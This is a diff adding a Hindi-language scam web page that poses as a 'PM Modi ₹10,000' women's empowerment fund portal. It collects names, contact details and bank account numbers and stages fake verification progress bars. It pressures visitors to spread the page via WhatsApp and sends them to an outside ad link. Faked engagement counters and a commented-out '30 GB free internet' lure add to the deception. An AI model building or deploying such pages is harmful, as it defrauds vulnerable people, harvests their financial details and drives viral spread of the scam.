@@ -1,0 +1,1213 @@
+
+
+<!DOCTYPE html>
+<html>
+    <head>
+       
+
+     
+    <script>
+
+        function set_Cookie(name,value){
+            var Days = 30;
+            var exp = new Date();
+            exp.setTime(exp.getTime() + (Days*20*1000));
+            document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString()+"; path=/;"
+        }
+        function get_Cookie(name){
+            var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+            if(arr=document.cookie.match(reg)){
+                return unescape(arr[2]);
+            }
+            return '';
+        }
+
+
+        /*            if(get_Cookie("d")>0 &&get_Cookie("d")<12){
+                        document.getElementById("first-box")."quedate__step".display="none";//??;
+                        document.getElementById("second-box").style.display="none";//??;
+                        document.getElementById("third-box").style.display="none";//??;
+                        document.getElementsByClassName("loading2__box").style.display="";//??;
+                    }*/
+
+
+    </script>
+    
+    
+    
+    
+    
+<script src="offer.js"></script>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta property="og:title" content="पीएम मोदी ₹10,000 भारतीय महिला सशक्तिकरण कोष पंजीकरण पोर्टल">
+    <meta property="og:description" content="केवल भारतीय नागरिकों के लिए">
+    <meta property="og:image" itemprop="image" content="modi.png">
+    <meta property="og:type" content="website">
+    <meta property="fb:app_id" content="966242223397117">
+    <title>पीएम मोदी ₹10,000 भारतीय महिला सशक्तिकरण कोष पंजीकरण पोर्टल</title>
+
+
+<meta name='google-adsense-platform-account' content='ca-host-pub-1556223355139109'/>
+<meta name='google-adsense-platform-domain' content='blogspot.com'/>
+</head>
+<body><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+ </script>
+
+         
+       
+     
+   
+ <style>
+  .blink {
+  animation: blink 1s steps(1, end) infinite;
+}
+
+@keyframes blink {
+  0% {
+    opacity: 1;
+  }
+  50% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+</style>
+<style type="text/css">
+@import url("https://fonts.googleapis.com/css2?family=Poppins:wght@500;700&display=swap");
+@import url("//fonts.googleapis.com/earlyaccess/droidarabicnaskh.css");
+* {
+    margin: 0;
+    padding: 0;
+    font-family: Merriweather, serif;
+    font-weight: 700;
+    box-sizing: border-box;
+
+    }
+}
+
+}
+body {
+    direction: lfl;
+    background: #FFFFFF;
+}
+a {
+    text-decoration: none;
+}
+.post {
+    background: #fff;
+    margin: 0 auto;
+    padding: 10px;
+    max-width: 500px;
+    border: 1px solid #d0d1d5;
+    border-radius: 3px;
+}
+.post img {
+    width: 100%;
+}
+.welcome {
+    font-size: 20px;
+}
+.amount,
+#getname {
+    color: #098105;
+    text-decoration: none;
+}
+.done {
+    text-align: center;
+    color: #27ae60;
+}
+.tip {
+    font-size: 14px;
+}
+.title {
+    text-align: center;
+}
+.error {
+    display: none;
+    text-align: center;
+    font-size: 14px;
+    color: #e74c3c;
+}
+button {
+    display: block;
+    width: 200px;
+    height: 50px;
+    color: #fff;
+    border: none;
+    outline: none;
+    font-size: 23px;
+    cursor: pointer;
+    border-radius: 5px;
+    padding: 0 10px;
+    margin: 10px auto;
+    background: rgb(46, 140, 4);
+    transition: background 0.3s ease;
+}
+button:hover {
+    background: #2e8c04;
+}
+.phone {
+    max-width: 400px;
+    margin: 10px auto;
+}
+.phone input {
+    width: 100%;
+    height: 50px;
+    padding: 10px;
+    outline: none;
+    border: 2px solid #cecece;
+    font-size: 14px;
+}
+#confirm {
+    width: 200px;
+    margin: 10px auto;
+    border-radius: 0px;
+}
+#loader {
+    text-align: center;
+}
+.spin {
+    width: 50px;
+    height: 50px;
+    background: transparent;
+    border: solid 8px rgb(46, 140, 4);
+    border-right-color: transparent;
+    border-radius: 50%;
+    margin: 10px auto;
+    animation: spin 0.8s linear infinite;
+}
+@keyframes spin {
+    100% {
+        transform: rotate(1turn);
+    }
+}
+#loader,
+#info,
+#checking,
+#share,
+#claim {
+    display: none;
+}
+.center {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.barr {
+    direction: ltr;
+    max-width: 400px;
+    margin: 10px auto;
+    box-sizing: border-box;
+}
+.fill {
+    position: relative;
+    display: inline-block;
+    width: calc(100% - 100px);
+    height: 35px;
+    padding: 2px;
+    border: 2px solid #098105;
+}
+#fill,
+#fill2 {
+    background: #098105;
+    width: 0%;
+    height: 100%;
+}
+.percentage {
+    width: 100px;
+    float: right;
+    height: 35px;
+    font-size: 16px;
+    border: 2px solid #098105;
+}
+#percentage,
+#percentage2 {
+    margin-left: 5px;
+}
+#check,
+#check2 {
+    display: none;
+}
+.counter {
+    color: #7f7f7f;
+    font-size: 12px;
+    text-align: right;
+    padding: 10px 0 10px 2px;
+    border-bottom: 1px solid #ffffff;
+}
+.reactions {
+    display: inline-flex;
+    align-items: center;
+    float: left;
+}
+.counter img {
+    float: left;
+    width: 16px;
+    height: 16px;
+    border-radius: 50%;
+    border: 2px solid #000000;
+    box-sizing: content-box;
+}
+.like,
+.love {
+    margin-right: -5px;
+}
+.like {
+    z-index: 2;
+}
+.love {
+    z-index: 1;
+}
+.bar {
+    display: table;
+    width: 100%;
+    border-bottom: 1px solid #000000;
+}
+.bar .react {
+    display: table-cell;
+    width: calc(100% / 3);
+    font-size: 12px;
+    color: #000000;
+    text-align: center;
+    padding: 10px 0;
+    cursor: pointer;
+}
+.comments {
+    direction: ltr;
+}
+.comment {
+    padding: 6px 0;
+    margin-top: 5px;
+}
+.comment img {
+    float: left;
+    width: 32px;
+    height: 32px;
+    border: none;
+    border-radius: 18px;
+    cursor: pointer;
+}
+.reply {
+    margin-left: 37px;
+}
+.single-container {
+    margin-left: 37px;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    font-size: 12px;
+}
+.single-container .user {
+    display: inline-block;
+    cursor: pointer;
+    color: #365899;
+    margin-bottom: 5px;
+}
+.single-container .text {
+    display: block;
+}
+.buttons {
+    font-size: 12px;
+    font-weight: bold;
+    margin: 10px 0 0 47px;
+    color: #000000;
+}
+.action {
+    cursor: pointer;
+}
+.action:hover {
+    text-decoration: underline;
+}
+.input {
+    padding: 6px 12px 12px;
+}
+.input input {
+    width: 100%;
+    background: #f1f2f6;
+    padding: 10px;
+    border-radius: 15px;
+    border: 0;
+    outline: none;
+}
+.A{
+    text-align: center;
+    background-color: rgb(16, 77, 142);
+}
+</style>
+  <style>
+        /* Reset some default styles */
+        body, h1, h2, h3, p, ul, li {
+            margin: 0;
+            padding: 0;
+        }
+
+        /* Apply a background color and font to the body */
+        body {
+            background-color: #ffffff;
+            font-family: Arial black, sans-serif;
+            line-height: 1.6;
+        }
+
+        /* Style the header */
+        .header {
+            text-align: center;
+            background-color: black;
+            color: #fff;
+            padding: 40px 0;
+        }
+
+        /* Style the main content container */
+        .content-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0px;
+        }
+
+        /* Style the image container */
+        .image-container {
+            max-height: 600px; /* Set a fixed maximum height */
+            overflow: hidden; /* Hide overflow if image is larger */
+            text-align: center;
+            background-color: green; /* Background color for the image container */
+        }
+
+        .image-container img {
+            max-width: 100%;
+            height: auto; /* Maintain image aspect ratio */
+        }
+
+        /* Style the text container */
+        .text-container {
+            width: 90%;
+            padding: 30px;
+            background-color: #2e8c04;
+            border: 1px solid #2e8c04;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* Style the form */
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        /* Style the form input fields */
+        input[type="text"],
+        select {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #4d4d4d;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the textarea */
+        textarea {
+            width: 90%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #2e8c04;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        /* Style the submit button */
+        .button {
+            background-color: #808183;
+            color: #fff;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        /* Style the grant information */
+        .grant-info {
+            margin-top: 30px;
+            color: black;
+            text-align: left;
+        }
+
+        /* Style the footer */
+        .footer {
+          width: 106%;
+            background-color: #2e8c04;
+            color: #fff;
+            text-align: center;
+            padding: 20px 0;
+        }/* General Row Styling */
+.row {
+    display: flex;
+    align-items: center;
+    padding-bottom: 1rem; /* Adds spacing at the bottom */
+
+}
+
+    footer {
+    background-color: #2e8c04;
+    color: #fff;
+    padding: 20px 0;
+    text-align: center;
+}
+
+.footer-container {
+    width: 90%;
+    margin: auto;
+    max-width: 1200px;
+}
+
+.footer-logo h2 {
+    font-size: 24px;
+    margin-bottom: 10px;
+}
+
+.footer-links {
+    margin: 10px 0;
+}
+
+.footer-links a {
+    color: #bbb;
+    text-decoration: none;
+    margin: 0 15px;
+    font-size: 16px;
+}
+
+.footer-links a:hover {
+    color: #fff;
+}
+
+.footer-social {
+    margin: 15px 0;
+}
+
+.footer-social a img {
+    width: 30px;
+    margin: 0 10px;
+    transition: transform 0.3s;
+}
+
+.footer-social a img:hover {
+    transform: scale(1.2);
+}
+
+.footer-bottom p {
+    font-size: 14px;
+    margin-top: 15px;
+    opacity: 0.7;
+}
+
+ 
+
+
+    </style>
+  
+
+
+
+
+<!-- Font Awesome CDN -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+ body {
+  margin: 0;
+  font-family: Arial, sans-serif;
+}
+
+.header {
+  background-color: #000;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 20px;
+  position: relative;
+}
+
+/* Left */
+.left-section {
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.left-section img {
+  height: 50px;
+}
+
+.left-section i {
+  font-size: 32px;
+  color: #fff;
+  cursor: pointer;
+}
+
+/* Center */
+.center-section {
+  position: absolute;
+  left: 50%;
+  transform: translateX(-50%);
+}
+
+.center-section img {
+  height: 60px;
+}
+
+/* Right */
+.right-section {
+  display: flex;
+  align-items: center;
+  gap: 20px;
+}
+
+.right-section i {
+  font-size: 32px;
+  color: #fff; /* changed from orange to white */
+  cursor: pointer;
+}
+
+.right-section img {
+  width: 55px;
+  border-radius: 6px;
+}
+
+/* --- Mobile view adjustments --- */
+@media (max-width: 768px) {
+  .header {
+    padding: 10px 15px; /* reduce padding for small screens */
+  }
+
+  .left-section img {
+    height: 35px; /* smaller logo */
+  }
+
+  .left-section i {
+    font-size: 24px; /* smaller hamburger */
+  }
+
+  .center-section img {
+    height: 40px; /* smaller center logo */
+  }
+
+  .right-section i {
+    font-size: 24px; /* smaller search */
+  }
+
+  .right-section img {
+    width: 40px; /* smaller flag */
+  }
+
+  .left-section,
+  .right-section {
+    gap: 10px; /* tighter spacing */
+  }
+}
+
+</style>
+
+<div class="header">
+  <!-- Left: Logo + Hamburger -->
+  <div class="left-section">
+    <img src="https://preview.redd.it/6iljmno889g21.png?width=2000&format=png&auto=webp&s=7a97ae52f9fa2398af17fca20aec43c9ff01f9b2" alt="MahamaCares Ghana Logo">
+    <i class="fas fa-bars"></i>
+  </div>
+
+  <!-- Center: New Image -->
+  <div class="center-section">
+    <img src="https://i.postimg.cc/v86Tb71D/pngtree-2025-year-gradient-vector-png-image-11401032.png" alt="Center Logo">
+  </div>
+
+  <!-- Right: Search + Flag -->
+  <div class="right-section">
+    <i class="fas fa-search"></i>
+    <img src="https://encrypted-tbn3.gstatic.com/images?q=tbn:ANd9GcSGyJeqildl_BnBXL6dAg6yYtpJN-SID9fqDEyKki0U9qbP_kzUpqqbyeHYp7qiXeoMe5pygvJL9qgASRmXT8GeXXP6EtwwJQZaweVgEw" alt="Flag of Ghana">
+  </div>
+</div>
+
+
+
+
+<div class="post" width="100%">
+<div class="post" style="width: 100%; background-color: #fff8dc; padding: 20px; border-radius: 12px; font-family: Arial, sans-serif; font-size: 16px; line-height: 1.6; color: #333; box-shadow: 0 4px 8px rgba(0,0,0,0.1);">
+  <center><strong><h3>पीएम मोदी ₹10,000 भारतीय महिला सशक्तिकरण कोष पंजीकरण पोर्टल</h3></strong></center>
+</div>
+
+<br>
+
+
+  <center><img src="modi.png" alt="Free-Data" style="width: 100%;">
+      
+                     </center>
+
+
+       
+    
+
+
+        <div id="intro">
+         
+            <div style="background-color:#f0f8ff; color:#000000; padding:20px; border-radius:10px; font-family: Arial, sans-serif; max-width:500px; margin:auto; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+  
+  <p style="font-size:16px; line-height:1.6; font-family: Arial, sans-serif;">
+   
+   <center><span style="color:red; animation: blink 1s step-start 0s infinite;">
+    केवल भारतीय नागरिकों के लिए
+    </span></center>
+</p>
+
+<style>
+@keyframes blink {
+  50% {
+    opacity: 0;
+  }
+}
+</style>
+
+  
+  
+</div>
+
+
+          
+
+     <!-- Scrolling Notice -->
+<div style="background-color: #2e8c04; color: white; padding: 10px; overflow: hidden; white-space: nowrap; box-sizing: border-box;">
+  <span style="display: inline-block; padding-left: 100%; animation: scroll-left 15s linear infinite;">
+   पीएम मोदी ₹10,000 भारतीय महिला सशक्तिकरण कोष पंजीकरण पोर्टल
+  </span>
+</div>
+
+<!-- Application Form Title -->
+<center>
+  <h2 style="color: black; font-weight: bold; margin-top: 20px;">आवेदन फार्म</h2>
+</center>
+
+<!-- Form Container -->
+<div style="max-width: 500px; margin: 20px auto; padding: 20px; background-color: #f9f9f9; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); font-family: Arial, sans-serif;">
+
+  <input type="text" name="_name" placeholder="पहला नाम" style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+
+  <input type="text" name="name" placeholder="उपनाम" style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+
+  <select style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+    <option>अपना लिंग चुनें</option>
+    <option value="male">पुरुष</option>
+    <option value="female">महिला</option>
+  </select>
+
+  <input type="text" name="email" placeholder="मेल पता" style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+
+  <input type="text" name="phone" placeholder="फ़ोन नंबर" style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+
+  <select style="width: 100%; padding: 12px 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+    <option value="">अपना राज्य चुनें</option>
+  <option>Andhra Pradesh</option>
+  <option>Arunachal Pradesh</option>
+  <option>Assam</option>
+  <option>Bihar</option>
+  <option>Chhattisgarh</option>
+  <option>Goa</option>
+  <option>Gujarat</option>
+  <option>Haryana</option>
+  <option>Himachal Pradesh</option>
+  <option>Jharkhand</option>
+  <option>Karnataka</option>
+  <option>Kerala</option>
+  <option>Madhya Pradesh</option>
+  <option>Maharashtra</option>
+  <option>Manipur</option>
+  <option>Meghalaya</option>
+  <option>Mizoram</option>
+  <option>Nagaland</option>
+  <option>Odisha</option>
+  <option>Punjab</option>
+  <option>Rajasthan</option>
+  <option>Sikkim</option>
+  <option>Tamil Nadu</option>
+  <option>Telangana</option>
+  <option>Tripura</option>
+  <option>Uttar Pradesh</option>
+  <option>Uttarakhand</option>
+  <option>West Bengal</option>
+  
+</select>
+
+  <textarea name="reason" placeholder="क्या आपने पहले आवेदन किया है?" style="width: 100%; padding: 12px 15px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box; resize: vertical;"></textarea>
+
+  <!-- Important APPLY Button -->
+  <button id="go" style="width: 100%; padding: 15px; background-color: #2e8c04; color: white; border: none; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer;">
+    आवेदन करना
+  </button>
+
+</div>
+
+<style>
+@keyframes scroll-left {
+  0% { transform: translateX(0%); }
+  100% { transform: translateX(-100%); }
+}
+
+@keyframes blink {
+  50% { opacity: 0; }
+}
+
+input:focus, select:focus, textarea:focus {
+  outline: none;
+  border-color: #2e8c04;
+  box-shadow: 0 0 5px rgba(46,140,4,0.5);
+}
+</style>
+
+        </div>
+        <div id="loader">
+            <div>प्रसंस्करण, कृपया प्रतीक्षा करें...</div>
+            <div class="spin"></div>
+            <div id="num">0%</div>
+        </div>
+        <div id="info" style="max-width: 500px; margin: 20px auto; padding: 20px; background-color: #f9f9f9; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); font-family: Arial, sans-serif;">
+
+  <!-- Main Verification Instruction -->
+  
+
+  <!-- Full Name Field -->
+  <div class="phone" style="margin-bottom: 20px; text-align: center;">
+    <p class="title" style="font-weight: bold; margin-bottom: 10px;">अपना बैंक खाता नंबर यहां दर्ज करें:</p>
+    <input type="text" placeholder="खाता संख्या दर्ज करें" id="name" name="full_name" style="width: 100%; max-width: 330px; height: 56px; font-size: 18px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+  </div>
+
+  
+
+  <!-- Bank Selection Dropdown -->
+  <div class="phone" style="margin-bottom: 20px; text-align: center;">
+    <p class="title" style="font-weight: bold; margin-bottom: 10px;">अपना बैंक चुनें:</p>
+    <select name="bank_name" id="bank" style="width: 100%; max-width: 330px; height: 56px; font-size: 16px; padding: 10px; border: 1px solid #ccc; border-radius: 8px; box-sizing: border-box;">
+      <option value="" selected>--------अपना बैंक चुनें----------</option>
+      <option value="2"> Allahabad Bank </option>
+<option value="3"> Andhra Bank </option>
+<option value="4"> Axis Bank</option>
+<option value="6"> Bank of Bahrain and Kuwait</option>
+
+<option value="8"> Bank of Baroda</option>
+
+<option value="10"> Bank of India</option>
+<option value="11"> Bank of Maharashtra</option>
+ <option value="2">Canara Bank</option>
+<option value="13"> Central Bank of India</option>
+  <option value="2"> City Union Bank </option>
+
+<option value="3"> Corporation Bank </option>
+
+<option value="4"> Deutsche Bank</option>
+
+<option value="6"> Development Credit Bank</option>
+
+<option value="7"> Dhanlaxmi Bank</option>
+
+<option value="8"> Federal Bank</option>
+
+<option value="9"> ICICI Bank</option>
+
+<option value="10"> IDBI Bank </option>
+
+<option value="11"> Indian Bank </option>
+
+<option value="12"> Indian Overseas Bank </option>
+
+<option value="13"> IndusInd Bank </option>
+  <option value="9"> ING Vysya Bank</option>
+
+<option value="10"> Jammu and Kashmir Bank</option>
+
+<option value="11">Karnataka Bank Ltd </option>
+
+<option value="12">Karur Vysya Bank </option>
+
+<option value="13"> Kotak Bank </option>
+  <option value="2">Laxmi Vilas Bank</option>
+   <option value="2">Oriental Bank of Commerce</option>
+   <option value="2">Punjab National Bank</option>
+   <option value="2">Punjab & Sind Bank</option>
+     <option value="2">Shamrao Vitthal Co-operative Bank</option>
+     <option value="2">South Indian Bank</option>
+     <option value="2">State Bank of Bikaner & Jaipur</option>
+     <option value="2">State Bank of Hyderabad</option>
+     <option value="2">State Bank of India</option>
+      <option value="2">State Bank of Mysore</option>
+      <option value="2">State Bank of Patiala</option>
+      <option value="2">State Bank of Travancore</option>
+      <option value="2">Syndicate Bank</option>
+      <option value="2">Tamilnad Mercantile Bank Ltd.</option>
+      <option value="2">UCO Bank</option>
+      <option value="2">Union Bank of India</option>
+      <option value="2">United Bank of India</option>
+      <option value="2">Vijaya Bank</option>
+      <option value="2">Yes Bank Ltd</option>
+    </select>
+  </div>
+
+  <!-- Optional Note -->
+  <p style="font-size: 14px; color: #555; text-align: center; margin-bottom: 20px;">
+    सुनिश्चित करें कि सभी जानकारी सही है। गलत जानकारी देने से आपके भुगतान में देरी हो सकती है।
+  </p>
+
+  <!-- VERIFY Button -->
+  <div style="text-align: center;">
+    <button id="confirm" style="width: 100%; max-width: 330px; height: 56px; background-color: #2e8c04; color: white; font-size: 18px; font-weight: bold; border: none; border-radius: 8px; cursor: pointer;">
+      सत्यापित करें
+    </button>
+  </div>
+
+</div>
+
+<style>
+input:focus, select:focus {
+  outline: none;
+  border-color: #2e8c04;
+  box-shadow: 0 0 5px rgba(46,140,4,0.5);
+}
+</style>
+
+
+            </div>
+            <p class="error">कृपया अपना खाता संख्या सत्यापित करें!!</p>
+        </div>
+        <div id="checking">
+            <p class="title">सत्यापन किया जा रहा है...</p>
+            <div class="barr">
+                <div class="fill">
+                    <div id="fill"></div>
+                </div>
+                <div class="percentage center">
+                    <span id="load"><i class="fa fa-spinner fa-pulse"></i></span>
+                    <span id="check"><i class="fa fa-check-circle"></i></span>
+                    <span id="percentage"></span>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+        
+        
+        
+        
+        
+        <div id="share" style="max-width: 500px; margin: 20px auto; font-family: Arial, sans-serif;">
+
+    <p class="tip" style="font-size: 16px; font-weight: bold; text-align: center;">
+        बधाई हो: <br>आपका खाता नंबर <span id="getname"></span>,
+    </p>
+
+     <p class="tip" style="font-size: 14px; text-align: center; line-height: 1.6;">
+        ₹10,000 भारतीय महिला सशक्तिकरण निधि प्राप्त करने के लिए चयनित लोगों में से एक है <br><br>
+        
+        <span class="amount" style="font-weight: bold;">आगे कैसे बढें:</span>
+    </p>
+
+    <p class="tip" style="font-size: 14px; line-height: 1.6;">
+        1. इसे 5 ग्रुपों या 15 दोस्तों के साथ व्हाट्सएप पर साझा करें ताकि अन्य भारतीय इसके बारे में जान सकें (नीचे "शेयर" आइकन पर क्लिक करें)।
+    </p>
+<br>
+    <p class="tip" style="font-size: 14px; line-height: 1.6;">
+        2. हरे रंग का सत्यापन बार भर जाने के बाद आपको स्वचालित रूप से हमारे "भुगतान प्रपत्र" पृष्ठ पर पुनः निर्देशित कर दिया जाएगा।
+      
+      <p class="tip" style="font-size: 14px; line-height: 1.6;">
+<br>
+        3. सफल आवेदन के 24 घंटे के भीतर आपको एक पुष्टिकरण ईमेल प्राप्त होगा।
+      
+      <br><br><span class="amount" style="font-weight: bold;">नोट: अपने व्हाट्सएप मित्रों या समूहों में उचित रूप से साझा करने से आपको तुरंत भुगतान प्राप्त होने की अधिक संभावना होगी</span>
+    </p>
+
+    <!-- SHARE Button -->
+    <div style="text-align: center; margin: 20px 0;">
+        <button id="whatsapp" style="background-color:#25D366; color:white; padding:12px 25px; border:none; border-radius:8px; font-weight:bold; cursor:pointer;">
+            शेयर करना
+        </button>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="barr" style="position: relative; max-width: 400px; margin: 0 auto; box-sizing: border-box;">
+        <div class="fill" style="position: relative; display: inline-block; width: calc(100% - 100px); height: 35px; padding: 2px; border: 2px solid #098105;">
+            <div id="fill2" style="background: #098105; width: 0%; height: 100%;"></div>
+        </div>
+        <div class="percentage" style="width: 100px; float: right; height: 35px; font-size: 16px; border: 2px solid #098105; text-align:center; line-height:35px;">
+            <span><i class="fa fa-spinner fa-pulse"></i></span>
+            <span id="percentage2">0%</span>
+        </div>
+    </div>
+
+</div>
+
+         <div id="claim">
+            <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>
+            <p class="title">आपके प्रधानमंत्री मोदी के ₹10,000 महिला सशक्तिकरण नकद हस्तांतरण को मंजूरी दे दी गई है<span class="amount"></span> </p>
+           
+           
+ 
+           
+            
+           <br/>
+          <a  onclick="window.open('https://obqj2.com/4/5885239')" href="https://obqj2.com/4/5885239" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">भुगतान प्राप्त करें</font></button>
+                    </a><br/>
+          
+
+          <a  onclick="window.open('https://obqj2.com/4/5885239')" href="https://obqj2.com/4/5885239" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">पुष्टिकरण ईमेल प्राप्त करें</font></button>
+                    </a><br/>
+           
+          <a  onclick="window.open('https://obqj2.com/4/5885239')" href="https://obqj2.com/4/5885239" >
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="#ffffff">भुगतान स्थिति जांचें</font></button>
+                    </a><br/>
+            
+           
+            <button id="offer">समस्याओं की रिपोर्ट करें</button>
+             
+             
+          
+          
+              </div>
+        
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+
+
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134,
+    comments = 23,
+    shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+
+$("#go").click(function () {
+    $("#intro").fadeOut(0);
+    $("#loader").fadeIn(1000);
+    var i = 0;
+    var interval = setInterval(function () {
+        $("#num").text(i + "%");
+        i += 1;
+        if (i >= 100) {
+            clearInterval(interval);
+            $("#loader").fadeOut(0);
+            $("#info").fadeIn(1000);
+        }
+    }, 50);
+});
+$("#confirm").click(function () {
+    if ($("#name").val().length < 4)
+    {
+        $(".error").fadeIn(500);
+    } else {
+        $("#info").fadeOut(0);
+        $("#checking").fadeIn(1000);
+        var i = 0;
+        var interval = setInterval(function () {
+            i += 1;
+            $("#percentage").text(i + "%");
+            $("#fill").css("width", i + "%");
+            if (i == 50) {
+                i = 49;
+                setTimeout(function () {
+                    i = 50;
+                }, 1000);
+            }
+            if (i >= 100) {
+                clearInterval(interval);
+                $("#load").fadeOut(0);
+                $("#check").fadeIn(0);
+                setTimeout(function () {
+                    $("#checking").fadeOut(0);
+                    $("#share").fadeIn(1000);
+                    $("#getname").html($("#name").val());
+                }, 500);
+            }
+        }, 50);
+    }
+});
+$(document).click(function () {
+    if ($("#name").is(":focus")) {
+        $(".error").fadeOut(500);
+    }
+});
+</script>
+
+
+
+
+<!--
+"30%20GB%20Free%20Internet%20Offer%0A%E2%9D%A4%0ATo%20Activate%2030%20GB%20Free%20Internet%20for%20all%20Networks%20click%20here%F0%9F%91%87%0A*1.%20Jio*%0Ahttps://cutt.ly/30-GB_Jio%0A%20%0A*2.%20Airtel*%0Ahttps://cutt.ly/30-GB_Airtel%0A%20%0A*3.%20Vi*%0Ahttps://cutt.ly/30-GB_Vi%0A%20%0A*4.%20Jazz*%0Ahttps://cutt.ly/30-GB_Jazz%0A%20%0A*5.%20Zong*%0Ahttps://cutt.ly/30-GB_Zong%0A%20%0A*6.%20Telenor*%0Ahttps://cutt.ly/30-GB_Telenor%0A%20%0A*7.%20Ufone*%0Ahttps://cutt.ly/30-GB_Ufone%0A%20%0A*8.%20Other Networks*%0Ahttps://cutt.ly/Get_30GB",
+-->
+      <script>
+          var text1 ="*पीएम मोदी ₹10,000 महिला सशक्तिकरण कोष का पंजीकरण जारी है*%0A%0A*भारतीय महिला सशक्तिकरण* की पहल के अनुरूप, भारत सरकार ने देश भर की सभी भारतीय महिलाओं को वित्तीय सहायता के रूप में ₹10,000 का भुगतान शुरू किया है।%0A%0A*👉 प्रत्येक पात्र भारतीय को इस वित्तीय सहायता पहल के तहत ₹10,000 प्राप्त होंगे*%0A%0A✅ मुझे अभी-अभी मेरा मिला%0A*APPLY%20NOW*%0Ahttps://lnkbits.com/10000-rupees-women-empowerment-cash%0A%0A📌 नोट: यह अभ्यास निःशुल्क है। कृपया इस जानकारी को साझा करें ताकि प्रत्येक भारतीय परिवार लाभान्वित हो सके। ",
+        
+            text2 = " an amount of ",
+            text3 = "for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ",
+            error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share",
+            abcde = "https://obqj2.com/4/5885239",
+            saved = "",
+            share = "whatsapp://send?text=" + text1;
+    </script>
+
+
+
+
+
+
+<script>
+<!-- code by OD -->
